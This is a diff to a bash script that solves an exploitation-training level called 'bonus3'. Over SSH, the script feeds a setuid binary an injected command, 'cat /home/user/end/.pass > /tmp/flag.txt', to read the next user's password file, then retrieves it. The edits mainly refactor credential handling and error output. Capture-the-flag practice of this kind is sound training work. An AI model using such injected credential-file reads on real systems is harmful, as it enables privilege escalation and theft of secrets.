@@ -22,21 +22,16 @@ log() {
 # #### #
 
 main() {
-    host="${host:-localhost}";
-    port="${port:-4242}";
-    username="${username:-bonus3}";
-    password="${password}";
     flag="";
 
     log "Authenticating to SSH server at $host:$port with username '$username'...";
-    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; };
+    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket." >&2; return 1; };
     ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
     (
-        printf '%s' 'sleep 1;'; # Not viable but should workout.
         printf '%s' 'cat '/home/user/end/.pass' > /tmp/flag.txt;';
     ) | ssh_exec_via_socket "$host" "$port" "$username" "env -i ./bonus3 ''";
     flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
-    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };
+    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket." >&2; return 1; };
 
     if [ -z "$flag" ]; then
         log "Error: flag is empty. Something went wrong.";
